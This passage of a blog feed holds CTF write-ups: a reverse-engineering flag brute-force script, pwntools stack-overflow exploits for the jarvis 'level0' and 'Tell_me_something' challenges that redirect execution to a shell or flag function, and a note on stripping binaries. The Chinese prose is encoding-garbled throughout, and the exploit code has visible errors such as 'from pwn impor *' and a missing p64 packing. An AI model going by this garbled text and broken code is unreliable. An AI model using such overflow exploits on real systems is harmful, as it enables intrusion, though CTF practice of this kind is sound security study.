class="lazyload"></p><p>Ê†à‰∏≠Âá∫Áé∞‰∫Ü‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊØîËæÉÁöÑÊï∞ÊçÆÔºåÂú®Êï∞ÊçÆÁ™óÂè£Ë∑üÈöèÔºåÂèØ‰ª•ÂèëÁé∞s2‰∏∫13‰∏™Â≠óËäÇÔºåÊ≠£Â•ΩÂØπÂ∫îÂâçÈù¢ÁöÑÈÇ£13‰∏™Êï∞ÊçÆ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd79f764ec2.png" class="lazyload"></p><p>‰ΩÜÊòØÂÖâÈù†Ëøô‰∫õ‰ø°ÊÅØÊàë‰ª¨ËÉΩÊãøÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÁ≠îÊ°àÂêóÔºüÊàë‰ª¨ÂèØ‰ª•ÂØπs1ËøõË°å‰∏Ä‰∫õÊìç‰ΩúÔºå‰πãÂâçËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤‰∏∫<code>helloword ÊàñÊìç‰ΩúÂ§ÑÁêÜÂêé==&gt; E8 E5 EC EC EF F7 EF F2 E4</code>„ÄÇÊàëÁúãÁΩë‰∏äÂæàÂ§öÊïôÁ®ãÊòØÁõ¥Êé•ÈÄöËøáÂºÇÊàñÔºåÂ∞Üs2ÂºÇÊàñ0x80ÂæóÂà∞ÁªìÊûúÔºàËÑëÊ¥ûÔºüÔºüÔºâ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd7e34f2571.png" class="lazyload"></p><p>‰∏Ä‰∏™Â≠óËäÇÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØËÉΩÈÄöËøáÂºÇÊàñÊìç‰ΩúÂπ∂‰∏îÊ†πÊçÆÂ∑≤Áü•Êù°‰ª∂ËÉΩÂ§üÂæóÂà∞ÊàñÊìç‰ΩúÁöÑÂéüÊìç‰ΩúÊï∞Ôºå‰ΩÜÊòØÊàëÂèØËÉΩÂ§™Ëèú‰∫Ü‰∏çÊ±ÇÁîöËß£ÔºåÂè™ËÉΩÂÜô‰∏™ËÑöÊú¨Êûö‰∏æ‰∏Ä‰∏ãflagÂ•Ω‰∫ÜÔºàÊ†πÊçÆidaÊ†πÊú¨Èöæ‰ª•ÁúãÂá∫Êù•Â•Ω‰∏çÂ•Ωüò≠ËøòÊòØÂ§™Ëèú‰∫Ü‰∏çËÉΩÊÄ™ida)„ÄÇ</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#</span>__Author__ <span class="token operator">=</span><span class="token string">"Yof3ng"</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> a <span class="token keyword">in</span> lists<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">|</span><span class="token number">0x80</span><span class="token operator">==</span>a<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></blockquote><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd7ed7225ae.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà21-jarvis-level0</title>
      <link href="/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/"/>
      <url>/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà21-jarvis-level0"><a href="#Pwn-10Êúà21-jarvis-level0" class="headerlink" title="Pwn-10Êúà21-jarvis-level0"></a>Pwn-10Êúà21-jarvis-level0</h1><blockquote><p>ËøôÈ¢òÊòØË°•‰∏äÊò®Â§©Ê≤°ÂÜôÂÆåÁöÑ‰∏ÄÈ¢ò„ÄÇ„ÄÇ„ÄÇËôΩÁÑ∂ÂæàÁÆÄÂçïüò≠üò≠</p></blockquote><h2 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h2><blockquote><p><code>file level0</code> and <code>checksec level0</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd13050ba5.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ËøôÁßçÁÆÄÂçïÁöÑpwnÈ¢òÂü∫Êú¨‰∏çÂºÄ‰øùÊä§Êé™ÊñΩÔºå‰∏çÁÑ∂ËèúÈ∏°Êàë‰πüÁé©‰∏ç‰∏ãÂéª„ÄÇ„ÄÇ„ÄÇ</p></blockquote><h2 id="ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"><a href="#ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë" class="headerlink" title="ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"></a>ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë</h2><blockquote><p>‰∏ÄÁî®IDA ProÊâìÂºÄÁ®ãÂ∫èÊñá‰ª∂ÁúãÁúãmainÂáΩÊï∞Â∞±ËÑëÊÆãÂú∞ÁúãÂà∞‰∫Ü<code>return vulnerable_function()</code></p><p><img src="https://i.loli.net/2018/10/21/5bcbd173656cc.png" alt=""></p><p>Ë∑üÁùÄÂéªËøô‰∏™ÂáΩÊï∞Áúã‰∏ÄÁúã:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd20189ae1.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÂÆö‰πâÁöÑbufÁ©∫Èó¥‰∏∫0x80,ËÄåËÉΩÂ§üÁî®readÂáΩÊï∞ËØªÂèñÁöÑ‰∏∫0x200ÔºåËÉΩÂ§üÈÄ†ÊàêÊ†àÊ∫¢Âá∫ÔºåÂπ∂‰∏îÂÆûÁé∞ÂáΩÊï∞Âú∞ÂùÄË¶ÜÁõñ„ÄÇËÄå‰∏îÊàë‰ª¨‰πüÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™callsystemÂáΩÊï∞ÔºåÁÇπËøõÂéªÁúãÁúãÂèØ‰ª•ÂèëÁé∞<code>system(&quot;/bin/sh&quot;)</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd2752027e.png" alt=""></p><p>ÈÇ£‰πàÊ†πÊçÆÈùôÊÄÅÂàÜÊûêÂá∫Êù•ÁöÑ‰ø°ÊÅØÂ§ßÊ¶ÇÂèØ‰ª•Á°ÆÂÆöÔºöÈ¶ñÂÖàÈÄöËøámainÂáΩÊï∞ËøîÂõûÂà∞vulnerable_functionÂáΩÊï∞ÔºåÁÑ∂ÂêéÈÄöËøávulnerable_functionÂáΩÊï∞Â∞ÜÊüêÂ§ÑËøîÂõûÂú∞ÂùÄË¶ÜÁõñ‰∏∫callsystemÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÁÑ∂Âêégetshell„ÄÇ</p></blockquote><h2 id="Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"><a href="#Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë" class="headerlink" title="Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"></a>Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë</h2><blockquote><p>gdb Ë∞ÉËØï‰∏Ä‰∏ãlevel0ÔºåÂÖàÂçïÊ≠•ÊâßË°åÂà∞vulnerable_function()ÂáΩÊï∞Ôºö</p><p><img src="https://i.loli.net/2018/10/21/5bcbd5dc96afe.png" alt=""></p><p>ÂÖàËøá‰∏ÄÈÅçËØ•ÂáΩÊï∞ÔºåÁÑ∂ÂêéËÆ∞ÂΩïÂÖ≥ÈîÆ‰ø°ÊÅØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbd6954fadf.png" class="lazyload"></p><p>ËÆ°ÁÆó‰∏Ä‰∏ãË∑ùÁ¶ªÔºö<code>hex(0x7fffffffdfc0 + 8 - 0x7fffffffdf40) = 0x88</code>ÔºåÈÇ£‰∏∫‰ªÄ‰πàÊØîÂÆö‰πâÁöÑ0x80Ë¶ÅÂ§ö0x08ÁöÑË∑ùÁ¶ªÂë¢ÔºüËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáida proÁöÑ<code>alt + k</code>Âø´Êç∑ÈîÆÊü•ÁúãbufÁöÑÊ†àÂ∏ßÔºå‰ºöÂèëÁé∞Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbd939b1a8b.png" class="lazyload"></p><p>ÈÄöËøágdbË∞ÉËØïÈáåÈù¢ÁöÑÂ§ö‰∏™ÂÖ≥ÈîÆ‰ø°ÊÅØÂØπÊØîÔºåÂÖ∂ÂÆûÂ§öÂá∫Êù•ÁöÑ0x08ÊòØÊ†àÂ∫ïÁöÑÂÜÖÂÆπÔºåÁªßÁª≠‰∏ã‰∏ÄÊ≠•ÔºåÂ∞±ÂèØ‰ª•ÁúãÂà∞ÊúÄÂºÄÂßãË¢´ÂéãÂÖ•Ê†à‰∏≠ÁöÑËøîÂõûÂú∞ÂùÄË¢´ÁΩÆÊ†àÈ°∂ÔºåÂáÜÂ§áËøîÂõûÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbda659d6b6.png" class="lazyload"></p><p>ÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÂºÄÂßãÊûÑÈÄ†expÂï¶üòÑ„ÄÇ</p></blockquote><h2 id="ÊîªÁ†¥"><a href="#ÊîªÁ†¥" class="headerlink" title="ÊîªÁ†¥"></a>ÊîªÁ†¥</h2><blockquote><p>ÈÄöËøá‰∏äÈù¢ÁöÑÈÄªËæëÊàë‰ª¨ÂèØ‰ª•ÂÜôÂá∫Â¶Ç‰∏ãexpÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level0"</span><span class="token punctuation">)</span>callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>padding <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> callsystem_addrio<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbdc2dbe46c.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂ∞±getshellÂï¶üòç„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà20-one-of-jarvis</title>
      <link href="/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
      <url>/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà20-jarvis-Tell-me-something"><a href="#Pwn-10Êúà20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10Êúà20-jarvis-Tell_me_something"></a>Pwn-10Êúà20-jarvis-Tell_me_something</h1><blockquote><p>‰ªäÂ§©ÁÆÄÂçïÂú∞ÂÅö‰∏Ä‰∏ãjarvis ojÁöÑ‰∏§ÈÅìÈ¢òÔºå<code>level0</code>Âíå<code>Tell_me_something</code>.</p><p>PS:ÂáåÊô®0:07  ÊòéÂ§©ÂÜôlevel0ÔºåÂÖ∂ÂÆû‰∏§È¢òÂ∑Æ‰∏çÂ§öÁöÑÈÄªËæëÔºåÊå∫ÁÆÄÂçïÁöÑ„ÄÇ</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p>È¶ñÂÖàÔºå<code>file gestbook</code>and<code>checksec guestbook</code>ÔºåÁÆÄÂçïÂú∞ÁúãÁúãÊñá‰ª∂‰ø°ÊÅØÂíå‰øùÊä§Êé™ÊñΩ</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÂÆÉÊòØÊ≤°ÊúâËÑ±Ë°£ÊúçÁöÑÔºåÁÑ∂ÂêéÊ≤°ÊúâÂºÄÂêØ‰øùÊä§Êé™ÊñΩ„ÄÇ</p></blockquote><h3 id="ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"><a href="#ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë" class="headerlink" title="ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"></a>ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë</h3><blockquote><p>Áî®IDA pro Áúã‰∏Ä‰∏ãËØ•Á®ãÂ∫èÁöÑÊ±áÁºñ‰ª£Á†ÅÔºåÂèØ‰ª•ÁúãÂà∞mainÂáΩÊï∞Ôºö</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5Â§ßÊ≥ïÔºåÁúãÁúã‰º™‰ª£Á†ÅÔºåÂæàÁÆÄÂçïÂ∞±ÂèØ‰ª•Âà§Êñ≠Âá∫Ê∫¢Âá∫ÁÇπÔºåÂõ†‰∏∫readÂáΩÊï∞ÂèØ‰ª•Â∞ÜË∂ÖÂá∫0x88Â§ßÂ∞èÁöÑÊï∞ÊçÆËØªÂÖ•Ê†àÁ©∫Èó¥Ôºö</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>ÁÑ∂ÂêéÊàë‰ª¨‰πüÂèØ‰ª•ÁúãÂà∞good_gameÂáΩÊï∞ÈáåÈù¢ÊúâÊàë‰ª¨Ë¶ÅÁöÑÂÖ≥ÈîÆ‰ø°ÊÅØÔºö</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>ÈÇ£‰πàÂà∞ËøôÈáåÂü∫Êú¨‰∏äÂèØ‰ª•Á°ÆÂÆöÔºåÊòØÈÄöËøáÊ∫¢Âá∫Êù•‰ΩøÁ®ãÂ∫èË∑≥ËΩ¨Âà∞good_gameÂáΩÊï∞‰ªéËÄåÂæóÂà∞flag„ÄÇ</p></blockquote><h3 id="Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"><a href="#Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë" class="headerlink" title="Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"></a>Âä®ÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë</h3><blockquote><p>È¶ñÂÖàÊîælinuxÈáåÈù¢Ë∑ë‰∏ÄË∑ëÔºö</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>Á°ÆÂÆû‰∫ßÁîü‰∫ÜÊ∫¢Âá∫ÁöÑÈóÆÈ¢òÔºåÁÑ∂ÂêéËøôÈáåÊàë‰ª¨Áî®‰∏Ä‰∏ãlinuxÂπ≥Âè∞ÁöÑ‰∏Ä‰∏™‰∫åËøõÂà∂ÂàÜÊûêËΩØ‰ª∂Ôºåradare2ÔºåËØ¥ÂÆûËØùËøòÊòØÂèØ‰ª•Áî®ÁöÑÔºåËøô‰∏™ËΩØ‰ª∂ÈõÜÊàê‰∫ÜÂæàÂ§öÂ∑•ÂÖ∑ÔºåÂπ∂‰∏î‰πüÂèØ‰ª•ËøõË°åÈÉ®ÂàÜÂú∞Âä®ÊÄÅË∞ÉËØïÔºà<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2ËØ¶ÁªÜÊïôÁ®ã</a>ÔºâÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb495987b21.png" class="lazyload"></p><p>Êé•‰∏ãÊù•Êàë‰ª¨Áî®gdbË∞ÉËØï‰∏Ä‰∏ãÔºåÂÖàÊûÑÈÄ†‰∏Ä‰∏™0x88ÈïøÂ∫¶ÁöÑpaddingËæìÂÖ•ÔºåÂÜçÁúãÁúãÊ†àÁ©∫Èó¥Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" class="lazyload"></p><p>ÂèØ‰ª•Áü•ÈÅìÂ∞ÜÈïøÂ∫¶‰∏∫0x88ÁöÑpaddingÂ°´ÂÖÖÂà∞Ê†àÁ©∫Èó¥‰πãÂêéÔºåËøòÂèØ‰ª•ËøõË°åË¶ÜÁõñÔºåÂõ†‰∏∫ÂèØ‰ª•ËØªÂèñÊúÄÂ§ß0x100Ôºà256ÔºâÂ§ßÂ∞èÁöÑÂ≠óÁ¨¶ÔºåËÄåebpÊ†àÂ∫ïÂá∫ÁïåÂ∞±ÊòØ‰∏Ä‰∏™ÂáΩÊï∞Âú∞ÂùÄÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÁúãËøô‰∏™ÂáΩÊï∞Âú∞ÂùÄÊúâ‰ªÄ‰πàÂÖ≥ÈîÆÊÄßÁöÑÊìç‰Ωú‰∏æÂä®Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" class="lazyload"></p><p>ËøõË°åÂçïÊ≠•ÊâßË°åÊµãËØïÊü•ÁúãËØ•Ê∫¢Âá∫ÁÇπËÉΩÂ§üË¢´Ë¶ÜÁõñÁöÑÂú∞ÂùÄÊòØÂê¶‰ºöË¢´ËøîÂõûÔºåÂÖàÈáçÊñ∞Êü•Áúã‰∏Ä‰∏ãËØ•Ê†à‰ΩçÁΩÆÂ≠òÂÇ®ÁöÑÂáΩÊï∞Âú∞ÂùÄ‰∏∫Â§öÂ∞ëÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Â≠òÂÇ®ÁöÑÂáΩÊï∞Âú∞ÂùÄ‰∏∫0x7ffff7a3fa87ÔºåÂà∞Ê†à‰ΩçÁΩÆÂç≥Â∞ÜÊîπÂèòÊó∂ÔºåËøõË°å‰∏ã‰∏ÄÊ≠•È™åËØÅÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" class="lazyload"></p><p>ÊâßË°å‰∏ã‰∏ÄÊ≠•Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" class="lazyload"></p><p>ÂÜç‰∏ã‰∏ÄÊ≠•Â∞±Â∞ÜËØ•ÂáΩÊï∞Âú∞ÂùÄÊîæÂÖ•‰∫ÜRIPÔºå‰Ωú‰∏∫‰∏ã‰∏ÄÊ≠•ËøêË°åÁöÑÂáΩÊï∞Êåá‰ª§Ôºö<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" class="lazyload"></p><p>ÈÇ£‰πàÂà∞ËøôÈáåÂ∑≤ÁªèÊòéÁôΩÂèØ‰ª•ËøîÂõûËØ•Âú∞ÂùÄË¶ÜÁõñÁöÑÂÜÖÂÆπÔºåÂÜôexp‰∫Ü„ÄÇ</p></blockquote><h3 id="ÊîªÁ†¥"><a href="#ÊîªÁ†¥" class="headerlink" title="ÊîªÁ†¥"></a>ÊîªÁ†¥</h3><blockquote><p>Áî®0x88ÈïøÂ∫¶ÁöÑÂÜÖÂÆπÂÅöpaddingÔºåÁÑ∂ÂêéÂ∞Ügood_gameÁöÑÂú∞ÂùÄÊîæÂà∞Â∞æÈÉ®ÔºåÁÑ∂ÂêéÊâßË°åÂç≥ÂèØ„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>ËøêË°åÁªìÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" class="lazyload"></p><p>ÂïäÊú¨Êù•‰ªäÂ§©ÊâìÁÆóÂÜô‰∏§È¢òÁöÑÂçöÂÆ¢ÔºåÁúãÊù•ËøôÁØáÂè™ËÉΩÊ∞¥‰∫ÜÔºåÂ§™Êôö‰∫ÜÂÖàÁù°‰∫Ü„ÄÇüò≠üò≠</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà17-strip</title>
      <link href="/2018/10/17/Pwn-10%E6%9C%8817-strip/"/>
      <url>/2018/10/17/Pwn-10%E6%9C%8817-strip/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà17-strip"><a href="#Pwn-10Êúà17-strip" class="headerlink" title="Pwn-10Êúà17-strip"></a>Pwn-10Êúà17-strip</h1><blockquote><p>stripÊòØlinux‰∏ãÁöÑ‰∏Ä‰∏™ÂëΩ‰ª§ÔºåÁî®‰∫éÁªôÁâπÂÆöÊñá‰ª∂Ê∂àÈô§ÔºåÂâ•Á¶ª‰∏Ä‰∫õÁ¨¶Âè∑‰ø°ÊÅØÂíåË∞ÉËØï‰ø°ÊÅØÔºåÈÄöÂ∏∏Ë¢´Âè´ÂÅö‚ÄúËÑ±Ë°£Êúç‚ÄùÔºåÂèØ‰ª•ÂáèÂ∞èÂèØÊâßË°åÊñá‰ª∂ÁöÑ‰ΩìÁßØÔºåÂèà‰∏çÂΩ±ÂìçÂÖ∂ËøêË°åÔºå‰ΩÜÊòØÂΩìËøôÁßçÁ®ãÂ∫èÂá∫Áé∞Âú®‰∫åËøõÂà∂ÂàÜÊûê‰∏≠Â∞±ÊØîËæÉÈ∫ªÁÉ¶‰∫ÜÔºåÂõ†‰∏∫Áî®stripÂëΩ‰ª§Â§ÑÁêÜËøáÁöÑÁ®ãÂ∫èÔºåÂèçÁºñËØëÂèØËÉΩ‰ºöÊØîËæÉÊ∑∑‰π±ÔºåÊúâÊó∂ÂÄô‰πüÈúÄË¶ÅÊÅ¢Â§çÁ¨¶Âè∑Ë°®Êù•ÂÆåÊàêÂàÜÊûê„ÄÇ</p><p>ÁÆÄÂçïÁºñËØë‰∏Ä‰∏™test.cÊñá‰ª∂ÔºåËÑ±ËÑ±Ë°£ÊúçËØïËØïÔºö</p><p><img src="https://i.loli.net/2018/10/17/5bc759646ed19.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÁºñËØëÂêéÁöÑtestÊñá‰ª∂‰ø°ÊÅØÔºånot strippedÔºåËøôÈáåÂÜçÁî®Âà∞linux‰∏ãÁöÑnmÂëΩ‰ª§ÔºåÊòØnamesÁöÑÁº©ÂÜôÔºåËÉΩÂ§üÂàóÂá∫Êñá‰ª∂ÁöÑÁ¨¶Âè∑ÂÄºÔºåÂáΩÊï∞ÂíåÂÖ®Â±ÄÂèòÈáèÁ≠â‰ø°ÊÅØÔºåÊõ¥ÂÆòÊñπ‰∏ÄÁÇπÁöÑÂ∞±ÊòØËøôÊ†∑ÁöÑËß£ÈáäÔºö<code>nmÂ∑•ÂÖ∑ÂàóÂá∫.oÊñá‰ª∂„ÄÅ.aÊñá‰ª∂„ÄÅ.soÊñá‰ª∂Á≠âÁöÑÁ¨¶Âè∑‰ø°ÊÅØÔºåÂåÖÊã¨ËØ∏Â¶ÇÁ¨¶Âè∑ÁöÑÂÄºÔºåÁ¨¶Âè∑Á±ªÂûãÂèäÁ¨¶Âè∑ÂêçÁß∞Á≠â„ÄÇÊâÄË∞ìÁ¨¶Âè∑ÔºåÈÄöÂ∏∏ÊåáÂÆö‰πâÂá∫ÁöÑÂáΩÊï∞ÔºåÂÖ®Â±ÄÂèòÈáèÁ≠âÁ≠â„ÄÇ</code>„ÄÇ</p><p><img src="https://i.loli.net/2018/10/17/5bc75a09ec273.png" alt=""></p><p>ÂÉè hacklu2018ÁöÑ‰∏Ä‰∏™È¢òÔºåÂ∞±ÊòØËÑ±‰∫ÜË°£ÊúçÁöÑÔºåÊ≤°ÊúâÁ¨¶Âè∑Ë°®Ôºö</p><p><img src="https://i.loli.net/2018/10/17/5bc75aa3b1afa.png" alt=""></p><p>ÈÇ£‰πàÁªôtestÊñá‰ª∂ËÑ±‰∏Ä‰∏ãËØïËØïÔºö</p><p><img src="https://i.loli.net/2018/10/17/5bc75ae6dcb39.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞Á¨¶Âè∑Ë°®Â∑≤ÁªèË¢´ËÑ±‰∏ãÔºåÂπ∂‰∏î‰∏çÂΩ±ÂìçÊ≠£Â∏∏ËøêË°å„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ÈÅó‰º†ÁÆóÊ≥ï</title>
      <link href="/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/"/>
      <url>/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/</url>
      
